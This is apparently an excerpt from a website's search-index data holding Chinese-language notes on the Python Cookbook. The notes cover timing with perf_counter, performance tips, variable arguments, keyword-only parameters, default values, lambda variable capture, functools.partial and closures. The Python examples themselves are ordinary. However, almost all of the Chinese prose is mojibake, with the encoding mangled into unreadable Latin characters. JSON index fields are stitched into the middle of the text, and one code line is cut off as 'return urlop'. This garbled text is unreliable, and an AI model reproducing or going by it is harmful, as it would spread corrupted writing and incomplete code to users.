perf_counter() å‡½æ•°ä¼šåœ¨ç»™å®šå¹³å°ä¸Šè·å–æœ€é«˜ç²¾åº¦çš„è®¡æ—¶å€¼ã€‚ä¸è¿‡ï¼Œå®ƒä»ç„¶è¿˜æ˜¯ åŸºäºæ—¶é’Ÿæ—¶é—´ï¼Œå¾ˆå¤šå› ç´ ä¼šå½±å“åˆ°å®ƒçš„ç²¾ç¡®åº¦ï¼Œæ¯”å¦‚æœºå™¨è´Ÿè½½ã€‚å¦‚æœä½ å¯¹äºæ‰§è¡Œæ—¶é—´æ›´ æ„Ÿå…´è¶£ï¼Œä½¿ç”¨ time.process_time() æ¥ä»£æ›¿å®ƒã€‚ æœ€åï¼Œå¦‚æœä½ æƒ³è¿›è¡Œæ›´æ·±å…¥çš„æ€§èƒ½åˆ†æï¼Œé‚£ä¹ˆä½ éœ€è¦è¯¦ç»†é˜…è¯» time ã€timeit å’Œå…¶ ä»–ç›¸å…³æ¨¡å—çš„æ–‡æ¡£ã€‚è¿™æ ·ä½ å¯ä»¥ç†è§£å’Œå¹³å°ç›¸å…³çš„å·®å¼‚ä»¥åŠä¸€äº›å…¶ä»–é™·é˜±ã€‚ åŠ é€Ÿç¨‹åºè¿è¡Œ é—®é¢˜ ä½ çš„ç¨‹åºè¿è¡Œå¤ªæ…¢ï¼Œä½ æƒ³åœ¨ä¸ä½¿ç”¨å¤æ‚æŠ€æœ¯æ¯”å¦‚ C æ‰©å±•æˆ– JIT ç¼–è¯‘å™¨çš„æƒ…å†µä¸‹åŠ  å¿«ç¨‹åºè¿è¡Œé€Ÿåº¦ã€‚ è§£å†³æ–¹æ¡ˆ å…³äºç¨‹åºä¼˜åŒ–çš„ç¬¬ä¸€ä¸ªå‡†åˆ™æ˜¯\"ä¸è¦ä¼˜åŒ–\"ï¼Œç¬¬äºŒä¸ªå‡†åˆ™æ˜¯\"ä¸è¦ä¼˜åŒ–é‚£äº›æ— å…³ç´§ è¦çš„éƒ¨åˆ†\"ã€‚å¦‚æœä½ çš„ç¨‹åºè¿è¡Œç¼“æ…¢ï¼Œé¦–å…ˆä½ å¾—ä½¿ç”¨ä¸Šä¸€èŠ‚çš„æŠ€æœ¯å…ˆå¯¹å®ƒè¿›è¡Œæ€§èƒ½ æµ‹è¯•æ‰¾åˆ°é—®é¢˜æ‰€åœ¨ã€‚ é€šå¸¸æ¥è®²ä½ ä¼šå‘ç°ä½ å¾—ç¨‹åºåœ¨å°‘æ•°å‡ ä¸ªçƒ­ç‚¹åœ°æ–¹èŠ±è´¹äº†å¤§é‡æ—¶é—´ï¼Œæ¯”å¦‚å†…å­˜çš„æ•° æ®å¤„ç†å¾ªç¯ã€‚ä¸€æ—¦ä½ å®šä½åˆ°è¿™äº›ç‚¹ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™äº›å®ç”¨æŠ€æœ¯æ¥åŠ é€Ÿç¨‹åºè¿è¡Œ: ä½¿ç”¨å‡½æ•°ä»£æ›¿å…¨å±€ä»£ç , è¿™æ˜¯å› ä¸ºå®šä¹‰åœ¨å…¨å±€èŒƒå›´çš„ä»£ç è¿è¡Œèµ·æ¥è¦æ¯”å®šä¹‰åœ¨å‡½æ•°ä¸­è¿è¡Œæ…¢ çš„å¤šã€‚è¿™ç§é€Ÿåº¦å·®å¼‚æ˜¯ç”±äºå±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡çš„å®ç°æ–¹å¼ï¼ˆä½¿ç”¨å±€éƒ¨å˜é‡è¦æ›´å¿«äº›ï¼‰ å°½å¯èƒ½å»æ‰å±æ€§è®¿é—®. æ¯ä¸€æ¬¡ä½¿ç”¨ç‚¹ (.) æ“ä½œç¬¦æ¥è®¿é—®å±æ€§çš„æ—¶å€™ä¼šå¸¦æ¥é¢å¤–çš„å¼€é”€ã€‚ å®ƒä¼šè§¦å‘ç‰¹å®šçš„æ–¹æ³•ï¼Œæ¯”å¦‚ __getattribute__() å’Œ __getattr__() ï¼Œ è¿™äº›æ–¹æ³•ä¼šè¿›è¡Œå­—å…¸æ“ä½œæ“ä½œ. (ä¸»è¦æ˜¯ä½¿ç”¨å¯¼å…¥çš„æ¨¡å—å§) ç†è§£å±€éƒ¨å˜é‡, ä¾‹å¦‚å®ä¾‹å‡½æ•°å†…, ä¸€å¼€å§‹å°±å°†self.valueèµ‹å€¼ç»™value(å±€éƒ¨å˜é‡) é¿å…ä¸å¿…è¦çš„æŠ½è±¡. ä»»ä½•æ—¶å€™å½“ä½ ä½¿ç”¨é¢å¤–çš„å¤„ç†å±‚ï¼ˆæ¯”å¦‚è£…é¥°å™¨ã€å±æ€§è®¿é—®ã€æè¿°å™¨ï¼‰å»åŒ…è£…ä½ çš„ä»£ ç æ—¶ï¼Œéƒ½ä¼šè®©ç¨‹åºè¿è¡Œå˜æ…¢ã€‚ ä½¿ç”¨å†…ç½®çš„å®¹å™¨. å†…ç½®çš„æ•°æ®ç±»å‹æ¯”å¦‚å­—ç¬¦ä¸²ã€å…ƒç»„ã€åˆ—è¡¨ã€é›†åˆå’Œå­—å…¸éƒ½æ˜¯ä½¿ç”¨ C æ¥å®ç°çš„ï¼Œè¿ è¡Œèµ·æ¥éå¸¸å¿«ã€‚å¦‚æœä½ æƒ³è‡ªå·±å®ç°æ–°çš„æ•°æ®ç»“æ„ï¼ˆæ¯”å¦‚é“¾æ¥åˆ—è¡¨ã€å¹³è¡¡æ ‘ç­‰ï¼‰ï¼Œé‚£ä¹ˆè¦ æƒ³åœ¨æ€§èƒ½ä¸Šè¾¾åˆ°å†…ç½®çš„é€Ÿåº¦å‡ ä¹ä¸å¯èƒ½ é¿å…åˆ›å»ºä¸å¿…è¦çš„æ•°æ®ç»“æ„æˆ–å¤åˆ¶. è®¨è®º åœ¨ä¼˜åŒ–ä¹‹å‰ï¼Œæœ‰å¿…è¦å…ˆç ”ç©¶ä¸‹ä½¿ç”¨çš„ç®—æ³•ã€‚é€‰æ‹©ä¸€ä¸ªå¤æ‚åº¦ä¸º O(n log n) çš„ç®—æ³• è¦æ¯”ä½ å»è°ƒæ•´ä¸€ä¸ªå¤æ‚åº¦ä¸º O(n**2) çš„ç®—æ³•æ‰€å¸¦æ¥çš„æ€§èƒ½æå‡è¦å¤§å¾—å¤šã€‚ å¦‚æœä½ è§‰å¾—ä½ è¿˜æ˜¯å¾—è¿›è¡Œä¼˜åŒ–ï¼Œé‚£ä¹ˆè¯·ä»æ•´ä½“è€ƒè™‘ã€‚ä½œä¸ºä¸€èˆ¬å‡†åˆ™ï¼Œä¸è¦å¯¹ç¨‹åºçš„ æ¯ä¸€ä¸ªéƒ¨åˆ†éƒ½å»ä¼˜åŒ–, å› ä¸ºè¿™äº›ä¿®æ”¹ä¼šå¯¼è‡´ä»£ç éš¾ä»¥é˜…è¯»å’Œç†è§£ã€‚ä½ åº”è¯¥ä¸“æ³¨äºä¼˜åŒ–äº§ ç”Ÿæ€§èƒ½ç“¶é¢ˆçš„åœ°æ–¹ï¼Œæ¯”å¦‚å†…éƒ¨å¾ªç¯ã€‚ ä½ è¿˜è¦æ³¨æ„å¾®å°ä¼˜åŒ–çš„ç»“æœã€‚ä¾‹å¦‚è€ƒè™‘ä¸‹é¢åˆ›å»ºä¸€ä¸ªå­—å…¸çš„ä¸¤ç§æ–¹å¼: a = {'name' : 'AAPL', 'shares' : 100, 'price' : 534.22} b = dict(name='AAPL', shares=100, price=534.22) åé¢ä¸€ç§å†™æ³•æ›´ç®€æ´ä¸€äº›ï¼ˆä½ ä¸éœ€è¦åœ¨å…³é”®å­—ä¸Šè¾“å…¥å¼•å·ï¼‰ã€‚ä¸è¿‡ï¼Œå¦‚æœä½ å°†è¿™ä¸¤ ä¸ªä»£ç ç‰‡æ®µè¿›è¡Œæ€§èƒ½æµ‹è¯•å¯¹æ¯”æ—¶ï¼Œä¼šå‘ç°ä½¿ç”¨ dict() çš„æ–¹å¼ä¼šæ…¢äº† 3 å€ã€‚çœ‹åˆ°è¿™ä¸ªï¼Œ ä½ æ˜¯ä¸æ˜¯æœ‰å†²åŠ¨æŠŠæ‰€æœ‰ä½¿ç”¨ dict() çš„ä»£ç éƒ½æ›¿æ¢æˆç¬¬ä¸€ç§ã€‚ä¸å¤Ÿï¼Œèªæ˜çš„ç¨‹åºå‘˜åªä¼š å…³æ³¨ä»–åº”è¯¥å…³æ³¨çš„åœ°æ–¹ï¼Œæ¯”å¦‚å†…éƒ¨å¾ªç¯ã€‚åœ¨å…¶ä»–åœ°æ–¹ï¼Œè¿™ç‚¹æ€§èƒ½æŸå¤±æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚ æœ€åæˆ‘å¼•ç”¨ John Ousterhout è¯´è¿‡çš„è¯ä½œä¸ºç»“å°¾ï¼š\"æœ€å¥½çš„æ€§èƒ½ä¼˜åŒ–æ˜¯ä»ä¸å·¥ä½œåˆ° å·¥ä½œçŠ¶æ€çš„è¿ç§»\"ã€‚ç›´åˆ°ä½ çœŸçš„éœ€è¦ä¼˜åŒ–çš„æ—¶å€™å†å»è€ƒè™‘å®ƒã€‚ç¡®ä¿ä½ ç¨‹åºæ­£ç¡®çš„è¿è¡Œé€š å¸¸æ¯”è®©å®ƒè¿è¡Œæ›´å¿«è¦æ›´é‡è¦ä¸€äº›ï¼ˆè‡³å°‘å¼€å§‹æ˜¯è¿™æ ·çš„ï¼‰","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Test,-debug-and-abnormal.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Test,-debug-and-abnormal.html"},{"title":"å‡½æ•°","text":"ä½¿ç”¨ def è¯­å¥å®šä¹‰å‡½æ•°æ˜¯æ‰€æœ‰ç¨‹åºçš„åŸºç¡€ã€‚æœ¬ç« çš„ç›®æ ‡æ˜¯è®²è§£ä¸€äº›æ›´åŠ é«˜çº§å’Œä¸ å¸¸è§çš„å‡½æ•°å®šä¹‰ä¸ä½¿ç”¨æ¨¡å¼ã€‚æ¶‰åŠåˆ°çš„å†…å®¹åŒ…æ‹¬é»˜è®¤å‚æ•°ã€ä»»æ„æ•°é‡å‚æ•°ã€å¼ºåˆ¶å…³é”®å­— å‚æ•°ã€æ³¨è§£å’Œé—­åŒ…ã€‚å¦å¤–ï¼Œä¸€äº›é«˜çº§çš„æ§åˆ¶æµå’Œåˆ©ç”¨å›è°ƒå‡½æ•°ä¼ é€’æ•°æ®çš„æŠ€æœ¯åœ¨è¿™é‡Œä¹Ÿ ä¼šè®²è§£åˆ°ã€‚ å¯æ¥å—ä»»æ„æ•°é‡å‚æ•°çš„å‡½æ•° æ¥å—ä»»æ„æ•°é‡çš„ä½ç½®å‚æ•°, ä½¿ç”¨ * def avg(first, *rest): return (first + sum(rest)) / (1 + len(rest)) # Sample use avg(1, 2) # 1.5 avg(1, 2, 3, 4) # 2.5 æ¥å—ä»»æ„æ•°é‡çš„å…³é”®å­—å‚æ•°ï¼Œä½¿ç”¨ä¸€ä¸ªä»¥ ** def make_element(name, value, **attrs): ... ä½ç½®å‚æ•°å®é™…æ˜¯å…ƒç»„ å…³é”®å­—å‚æ•°å®é™…æ˜¯å­—å…¸ ä¸€èµ·ç”¨: def anyargs(*args, **kwargs): ... ä¸€ä¸ª * å‚æ•°åªèƒ½å‡ºç°åœ¨å‡½æ•°å®šä¹‰ä¸­æœ€åä¸€ä¸ªä½ç½®å‚æ•°åé¢ï¼Œè€Œ ** å‚æ•°åªèƒ½å‡ºç°åœ¨ æœ€åä¸€ä¸ªå‚æ•°ã€‚æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ * å‚æ•°åé¢ä»ç„¶å¯ä»¥å®šä¹‰å…¶ä»–å‚æ•°: def a(x, *args, y): ... def b(x, *args, y, **kwargs): ... å³ å¼ºåˆ¶å…³é”®å­—å‚æ•°. åªæ¥å—å…³é”®å­—å‚æ•°çš„å‡½æ•° å¸Œæœ›å‡½æ•°çš„æŸäº›å‚æ•°å¼ºåˆ¶ä½¿ç”¨å…³é”®å­—å‚æ•°ä¼ é€’ å°†å¼ºåˆ¶å…³é”®å­—å‚æ•°æ”¾åˆ°æŸä¸ª * å‚æ•°æˆ–è€…å•ä¸ª * åé¢å°±èƒ½è¾¾åˆ°è¿™ç§æ•ˆæœ: def recv(maxsize, *, block): 'Receives a message' pass recv(1024, True) # TypeError recv(1024, block=True) # Ok ç»™å‡½æ•°å‚æ•°å¢åŠ å…ƒä¿¡æ¯ ä½ å†™å¥½äº†ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åæƒ³ä¸ºè¿™ä¸ªå‡½æ•°çš„å‚æ•°å¢åŠ ä¸€äº›é¢å¤–çš„ä¿¡æ¯ï¼Œè¿™æ ·çš„è¯å…¶ä»– ä½¿ç”¨è€…å°±èƒ½æ¸…æ¥šçš„çŸ¥é“è¿™ä¸ªå‡½æ•°åº”è¯¥æ€ä¹ˆä½¿ç”¨ã€‚ ä½¿ç”¨å‡½æ•°å‚æ•°æ³¨è§£: def add(x:int, y:int) -> int: return x + y python è§£é‡Šå™¨ä¸ä¼šå¯¹è¿™äº›æ³¨è§£æ·»åŠ ä»»ä½•çš„è¯­ä¹‰ã€‚å®ƒä»¬ä¸ä¼šè¢«ç±»å‹æ£€æŸ¥ï¼Œè¿è¡Œæ—¶è·Ÿ æ²¡æœ‰åŠ æ³¨è§£ä¹‹å‰çš„æ•ˆæœä¹Ÿæ²¡æœ‰ä»»ä½•å·®è·ã€‚ç„¶è€Œï¼Œå¯¹äºé‚£äº›é˜…è¯»æºç çš„äººæ¥è®²å°±å¾ˆæœ‰å¸®åŠ© å•¦ã€‚ç¬¬ä¸‰æ–¹å·¥å…·å’Œæ¡†æ¶å¯èƒ½ä¼šå¯¹è¿™äº›æ³¨è§£æ·»åŠ è¯­ä¹‰ã€‚åŒæ—¶å®ƒä»¬ä¹Ÿä¼šå‡ºç°åœ¨æ–‡æ¡£ä¸­ã€‚ å‡½æ•°æ³¨è§£åªå­˜å‚¨åœ¨å‡½æ•°çš„ __annotations__ å±æ€§ä¸­ è¿”å›å¤šä¸ªå€¼çš„å‡½æ•° å‡½æ•°ç›´æ¥ return ä¸€ä¸ªå…ƒç»„å°±è¡Œ: def myfun(): return 1, 2, 3 çœ‹ä¸Šå»è¿”å›äº†å¤šä¸ªå€¼ï¼Œå®é™…ä¸Šæ˜¯å…ˆåˆ›å»ºäº†ä¸€ä¸ªå…ƒç»„ç„¶åè¿”å›çš„ã€‚è¿™ ä¸ªè¯­æ³•çœ‹ä¸Šå»æ¯”è¾ƒå¥‡æ€ªï¼Œå®é™…ä¸Šæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯é€—å·æ¥ç”Ÿæˆä¸€ä¸ªå…ƒç»„ï¼Œè€Œä¸æ˜¯ç”¨æ‹¬å·. å®šä¹‰æœ‰é»˜è®¤å‚æ•°çš„å‡½æ•° å®šä¹‰ä¸€ä¸ªå‡½æ•°æˆ–è€…æ–¹æ³•ï¼Œå®ƒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°æ˜¯å¯é€‰çš„å¹¶ä¸”æœ‰ä¸€ä¸ªé»˜è®¤å€¼ ç›´æ¥åœ¨å‡½æ•°å®šä¹‰ä¸­ç»™å‚æ•°æŒ‡å®šä¸€ä¸ªé»˜ è®¤å€¼ï¼Œå¹¶æ”¾åˆ°å‚æ•°åˆ—è¡¨æœ€åå°±è¡Œäº†: def spam(a, b=42): print(a, b) å¦‚æœé»˜è®¤å‚æ•°æ˜¯ä¸€ä¸ªå¯ä¿®æ”¹çš„å®¹å™¨æ¯”å¦‚ä¸€ä¸ªåˆ—è¡¨ã€é›†åˆæˆ–è€…å­—å…¸ï¼Œå¯ä»¥ä½¿ç”¨ None ä½œä¸ºé»˜è®¤å€¼: # Using a list as a default value def spam(a, b=None): if b is None: b = [] å¦‚æœä½ å¹¶ä¸æƒ³æä¾›ä¸€ä¸ªé»˜è®¤å€¼ï¼Œè€Œæ˜¯æƒ³ä»…ä»…æµ‹è¯•ä¸‹æŸä¸ªé»˜è®¤å‚æ•°æ˜¯ä¸æ˜¯æœ‰ä¼ é€’è¿› æ¥ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·å†™: _no_value = object() def spam(a, b=_no_value): if b is _no_value: print('No b value supplied') æµ‹è¯•: >>> spam(1) No b value supplied >>> spam(1, 2) # b = 2 >>> spam(1, None) # b = None >>> ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°åˆ°ä¼ é€’ä¸€ä¸ª None å€¼å’Œä¸ä¼ å€¼ä¸¤ç§æƒ…å†µæ˜¯æœ‰å·®åˆ«çš„ã€‚ é»˜è®¤å‚æ•°çš„å€¼ä»…ä»…åœ¨å‡½æ•°å®šä¹‰çš„æ—¶å€™èµ‹å€¼ä¸€æ¬¡: >>> x = 42 >>> def spam(a, b=x): ... print(a, b) ... >>> spam(1) 1 42 >>> x = 23 # Has no effect >>> spam(1) 1 42 >>> é»˜è®¤å‚æ•°çš„å€¼åº”è¯¥æ˜¯ä¸å¯å˜çš„å¯¹è±¡ï¼Œæ¯”å¦‚ Noneã€Trueã€Falseã€æ•°å­—æˆ–å­—ç¬¦ ä¸²ã€‚ æœ€åä¸€ä¸ªé—®é¢˜æ¯”è¾ƒå¾®å¦™ï¼Œé‚£å°±æ˜¯ä¸€ä¸ªå‡½æ•°éœ€è¦æµ‹è¯•æŸä¸ªå¯é€‰å‚æ•°æ˜¯å¦è¢«ä½¿ç”¨è€…ä¼  é€’è¿›æ¥ã€‚è¿™æ—¶å€™éœ€è¦å°å¿ƒçš„æ˜¯ä½ ä¸èƒ½ç”¨æŸä¸ªé»˜è®¤å€¼æ¯”å¦‚ Noneã€0 æˆ–è€… False å€¼æ¥æµ‹è¯•ç”¨ æˆ·æä¾›çš„å€¼ (å› ä¸ºè¿™äº›å€¼éƒ½æ˜¯åˆæ³•çš„å€¼ï¼Œæ˜¯å¯èƒ½è¢«ç”¨æˆ·ä¼ é€’è¿›æ¥çš„)ã€‚å› æ­¤ï¼Œä½ éœ€è¦å…¶ä»– çš„è§£å†³æ–¹æ¡ˆäº†ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ç§æœ‰å¯¹è±¡å®ä¾‹ï¼Œå°±åƒä¸Šé¢çš„ _no_value å˜é‡é‚£æ ·ã€‚åœ¨å‡½æ•°é‡Œé¢ï¼Œä½ å¯ä»¥é€šè¿‡æ£€æŸ¥è¢«ä¼ é€’å‚æ•°å€¼è·Ÿè¿™ä¸ªå®ä¾‹æ˜¯å¦ä¸€æ · æ¥åˆ¤æ–­ã€‚è¿™é‡Œçš„æ€è·¯æ˜¯ç”¨æˆ·ä¸å¯èƒ½å»ä¼ é€’è¿™ä¸ª _no_value å®ä¾‹ä½œä¸ºè¾“å…¥ã€‚å› æ­¤ï¼Œè¿™é‡Œ é€šè¿‡æ£€æŸ¥è¿™ä¸ªå€¼å°±èƒ½ç¡®å®šæŸä¸ªå‚æ•°æ˜¯å¦è¢«ä¼ é€’è¿›æ¥äº†ã€‚ å®šä¹‰åŒ¿åæˆ–å†…è”å‡½æ•° ä½ æƒ³ä¸º sort() æ“ä½œåˆ›å»ºä¸€ä¸ªå¾ˆçŸ­çš„å›è°ƒå‡½æ•°ï¼Œä½†åˆä¸æƒ³ç”¨ def å»å†™ä¸€ä¸ªå•è¡Œå‡½ æ•°ï¼Œè€Œæ˜¯å¸Œæœ›é€šè¿‡æŸä¸ªå¿«æ·æ–¹å¼ä»¥å†…è”æ–¹å¼æ¥åˆ›å»ºè¿™ä¸ªå‡½æ•°ã€‚ ä»¥ä½¿ç”¨ lambda è¡¨è¾¾å¼: >>> add = lambda x, y: x + y >>> add(2,3) 5 >>> add('hello', 'world') 'helloworld' >>> å°½ç®¡ lambda è¡¨è¾¾å¼å…è®¸ä½ å®šä¹‰ç®€å•å‡½æ•°ï¼Œä½†æ˜¯å®ƒçš„ä½¿ç”¨æ˜¯æœ‰é™åˆ¶çš„ã€‚ä½ åªèƒ½æŒ‡å®š å•ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒçš„å€¼å°±æ˜¯æœ€åçš„è¿”å›å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸èƒ½åŒ…å«å…¶ä»–çš„è¯­è¨€ç‰¹æ€§äº†ï¼ŒåŒ…æ‹¬å¤š ä¸ªè¯­å¥ã€æ¡ä»¶è¡¨è¾¾å¼ã€è¿­ä»£ä»¥åŠå¼‚å¸¸å¤„ç†ç­‰ç­‰ã€‚ åŒ¿åå‡½æ•°æ•è·å˜é‡å€¼ ç”¨ lambda å®šä¹‰äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶æƒ³åœ¨å®šä¹‰æ—¶æ•è·åˆ°æŸäº›å˜é‡çš„å€¼ã€‚ lambda è¡¨è¾¾å¼ä¸­çš„ x æ˜¯ä¸€ä¸ªè‡ªç”±å˜é‡ï¼Œåœ¨è¿è¡Œæ—¶ç»‘å®šå€¼ï¼Œè€Œä¸ æ˜¯å®šä¹‰æ—¶å°±ç»‘å®šï¼Œè¿™è·Ÿå‡½æ•°çš„é»˜è®¤å€¼å‚æ•°å®šä¹‰æ˜¯ä¸åŒçš„ã€‚å› æ­¤ï¼Œåœ¨è°ƒç”¨è¿™ä¸ª lambda è¡¨ è¾¾å¼çš„æ—¶å€™ï¼Œx çš„å€¼æ˜¯æ‰§è¡Œæ—¶çš„å€¼: >>> x = 10 >>> a = lambda y: x + y >>> x = 20 >>> b = lambda y: x + y >>> >>> a(10) 30 >>> b(10) 30 >>> å¦‚æœä½ æƒ³è®©æŸä¸ªåŒ¿åå‡½æ•°åœ¨å®šä¹‰æ—¶å°±æ•è·åˆ°å€¼ï¼Œå¯ä»¥å°†é‚£ä¸ªå‚æ•°å€¼å®šä¹‰æˆé»˜è®¤å‚ æ•°å³å¯ï¼Œå°±åƒä¸‹é¢è¿™æ ·: >>> x = 10 >>> a = lambda y, x=x: x + y >>> x = 20 >>> b = lambda y, x=x: x + y >>> a(10) 20 >>> b(10) 30 >>> åœ¨è¿™é‡Œåˆ—å‡ºæ¥çš„é—®é¢˜æ˜¯æ–°æ‰‹å¾ˆå®¹æ˜“çŠ¯çš„é”™è¯¯ï¼Œæœ‰äº›æ–°æ‰‹å¯èƒ½ä¼šä¸æ°å½“çš„ä½¿ç”¨ lambda è¡¨è¾¾å¼ã€‚æ¯”å¦‚ï¼Œé€šè¿‡åœ¨ä¸€ä¸ªå¾ªç¯æˆ–åˆ—è¡¨æ¨å¯¼ä¸­åˆ›å»ºä¸€ä¸ª lambda è¡¨è¾¾å¼åˆ—è¡¨ï¼Œå¹¶ æœŸæœ›å‡½æ•°èƒ½åœ¨å®šä¹‰æ—¶å°±è®°ä½æ¯æ¬¡çš„è¿­ä»£å€¼ã€‚ä¾‹å¦‚: >>> funcs = [lambda x: x+n for n in range(5)] >>> for f in funcs: ... print(f(0)) ... 4 4 4 4 4 >>> ä½†æ˜¯å®é™…æ•ˆæœæ˜¯è¿è¡Œæ˜¯ n çš„å€¼ä¸ºè¿­ä»£çš„æœ€åä¸€ä¸ªå€¼ã€‚ç°åœ¨æˆ‘ä»¬ç”¨å¦ä¸€ç§æ–¹å¼ä¿®æ”¹ ä¸€ä¸‹: >>> funcs = [lambda x, n=n: x+n for n in range(5)] >>> for f in funcs: ... print(f(0)) ... 0 1 2 3 4 >>> é€šè¿‡ä½¿ç”¨å‡½æ•°é»˜è®¤å€¼å‚æ•°å½¢å¼ï¼Œlambda å‡½æ•°åœ¨å®šä¹‰æ—¶å°±èƒ½ç»‘å®šåˆ°å€¼ã€‚ å‡å°‘å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•°ä¸ªæ•° ä½ æœ‰ä¸€ä¸ªè¢«å…¶ä»– python ä»£ç ä½¿ç”¨çš„ callable å¯¹è±¡ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°æˆ–è€…æ˜¯ä¸€ ä¸ªå¤„ç†å™¨ï¼Œä½†æ˜¯å®ƒçš„å‚æ•°å¤ªå¤šäº†ï¼Œå¯¼è‡´è°ƒç”¨æ—¶å‡ºé”™ã€‚ å¦‚æœéœ€è¦å‡å°‘æŸä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°ï¼Œä½ å¯ä»¥ä½¿ç”¨ functools.partial() ã€‚partial() å‡½æ•°å…è®¸ä½ ç»™ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°è®¾ç½®å›ºå®šçš„å€¼ï¼Œå‡å°‘æ¥ä¸‹æ¥è¢«è°ƒç”¨æ—¶çš„å‚æ•°ä¸ªæ•°ã€‚ä¸ºäº†æ¼” ç¤ºæ¸…æ¥šï¼Œå‡è®¾ä½ æœ‰ä¸‹é¢è¿™æ ·çš„å‡½æ•°: def spam(a, b, c, d): print(a, b, c, d) ä½¿ç”¨ partial() å‡½æ•°æ¥å›ºå®šæŸäº›å‚æ•°å€¼: >>> from functools import partial >>> s1 = partial(spam, 1) # a = 1 >>> s1(2, 3, 4) 1 2 3 4 >>> s1(4, 5, 6) 1 4 5 6 >>> s2 = partial(spam, d=42) # d = 42 >>> s2(1, 2, 3) 1 2 3 42 >>> s2(4, 5, 5) 4 5 5 42 >>> s3 = partial(spam, 1, 2, d=42) # a = 1, b = 2, d = 42 >>> s3(3) 1 2 3 42 >>> s3(4) 1 2 4 42 >>> s3(5) 1 2 5 42 >>> å¯ä»¥çœ‹å‡º partial() å›ºå®šæŸäº›å‚æ•°å¹¶è¿”å›ä¸€ä¸ªæ–°çš„ callable å¯¹è±¡ã€‚è¿™ä¸ªæ–°çš„ callable æ¥å—æœªèµ‹å€¼çš„å‚æ•°ï¼Œç„¶åè·Ÿä¹‹å‰å·²ç»èµ‹å€¼è¿‡çš„å‚æ•°åˆå¹¶èµ·æ¥ï¼Œæœ€åå°†æ‰€æœ‰å‚æ•°ä¼ é€’ç»™åŸ å§‹å‡½æ•°ã€‚ æœ¬èŠ‚è¦è§£å†³çš„é—®é¢˜æ˜¯è®©åŸæœ¬ä¸å…¼å®¹çš„ä»£ç å¯ä»¥ä¸€èµ·å·¥ä½œã€‚ä¸‹é¢æˆ‘ä¼šåˆ—ä¸¾ä¸€ç³»åˆ—çš„ ä¾‹å­ã€‚ ç¬¬ä¸€ä¸ªä¾‹å­æ˜¯ï¼Œå‡è®¾ä½ æœ‰ä¸€ä¸ªç‚¹çš„åˆ—è¡¨æ¥è¡¨ç¤º (x,y) åæ ‡å…ƒç»„ã€‚ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ å‡½æ•°æ¥è®¡ç®—ä¸¤ç‚¹ä¹‹é—´çš„è·ç¦»: points = [ (1, 2), (3, 4), (5, 6), (7, 8) ] import math def distance(p1, p2): x1, y1 = p1 x2, y2 = p2 return math.hypot(x2 - x1, y2 - y1) ç°åœ¨å‡è®¾ä½ æƒ³ä»¥æŸä¸ªç‚¹ä¸ºåŸºç‚¹ï¼Œæ ¹æ®ç‚¹å’ŒåŸºç‚¹ä¹‹é—´çš„è·ç¦»æ¥æ’åºæ‰€æœ‰çš„è¿™äº›ç‚¹ã€‚åˆ— è¡¨çš„ sort() æ–¹æ³•æ¥å—ä¸€ä¸ªå…³é”®å­—å‚æ•°æ¥è‡ªå®šä¹‰æ’åºé€»è¾‘ï¼Œä½†æ˜¯å®ƒåªèƒ½æ¥å—ä¸€ä¸ªå•ä¸ªå‚ æ•°çš„å‡½æ•° (distance() å¾ˆæ˜æ˜¾æ˜¯ä¸ç¬¦åˆæ¡ä»¶çš„)ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ partial() æ¥è§£ å†³è¿™ä¸ªé—®é¢˜: >>> pt = (4, 3) >>> points.sort(key=partial(distance,pt)) >>> points [(3, 4), (1, 2), (5, 6), (7, 8)] >>> å°†å•æ–¹æ³•çš„ç±»è½¬æ¢ä¸ºå‡½æ•° æœ‰ä¸€ä¸ªé™¤ __init__() æ–¹æ³•å¤–åªå®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•çš„ç±»ã€‚ä¸ºäº†ç®€åŒ–ä»£ç ï¼Œä½ æƒ³å°†å®ƒ è½¬æ¢æˆä¸€ä¸ªå‡½æ•° å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨é—­åŒ…æ¥å°†å•ä¸ªæ–¹æ³•çš„ç±»è½¬æ¢æˆå‡½æ•°ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä¸‹é¢ç¤ºä¾‹ ä¸­çš„ç±»å…è®¸ä½¿ç”¨è€…æ ¹æ®æŸä¸ªæ¨¡æ¿æ–¹æ¡ˆæ¥è·å–åˆ° URL é“¾æ¥åœ°å€: from urllib.request import urlopen class UrlTemplate: def __init__(self, template): self.template = template def open(self, **kwargs): return urlop è¿™ä¸ªç±»å¯ä»¥è¢«ä¸€ä¸ªæ›´ç®€å•çš„å‡½æ•°æ¥ä»£æ›¿: def urltemplate(template): def opener(**kwargs): return urlopen(template.format_map(kwargs)) return opener å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œä½ æ‹¥æœ‰ä¸€ä¸ªå•æ–¹æ³•ç±»çš„åŸå› æ˜¯éœ€è¦å­˜å‚¨æŸäº›é¢å¤–çš„çŠ¶æ€æ¥ç»™æ–¹æ³• ä½¿ç”¨ã€‚æ¯”å¦‚ï¼Œå®šä¹‰ UrlTemplate 